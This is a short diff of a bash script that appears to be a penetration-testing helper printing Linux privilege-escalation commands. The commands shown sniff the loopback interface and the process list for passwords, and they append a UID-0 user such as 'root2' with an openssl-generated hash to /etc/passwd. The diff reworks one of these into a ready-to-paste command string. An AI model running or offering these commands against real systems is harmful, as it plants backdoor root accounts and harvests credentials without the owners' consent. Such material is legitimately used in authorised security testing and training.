@@ -12,7 +12,7 @@ linux_esclation_strategy() {
     echo 'watch -n 1 "ps -aux | grep pass"'
     echo 'sudo tcpdump -i lo -A | grep "pass"'
     echo "Look at cron jobs"
-    grep "CRON" /var/log/syslog
+    echo 'grep "CRON" /var/log/syslog'
     echo 'Adding password to /etc/passwd'
     echo 'openssl passwd w00t'
     echo 'echo "root2:$(openssl passwd w00t):0:0:root2:/root:/bin/bash" >> /etc/passwd'
@@ -49,9 +49,10 @@ create_passwd_user() {
         password=password
         echo "password is not set, using default: $password"
     fi
-    echo "password_hash=\$(openssl passwd $password)"
-    echo "echo \"\$password_hash\""
-    echo "echo \"$username:\$password_hash:0:0:root:/root:/bin/bash\" >> /etc/passwd"
+    cmd="password_hash=\$(openssl passwd $password);"
+    cmd+="echo \"\$password_hash\";"
+    cmd+="echo \"$username:\$password_hash:0:0:root:/root:/bin/bash\" >> /etc/passwd"
+    echo "$cmd"
 
 }
 
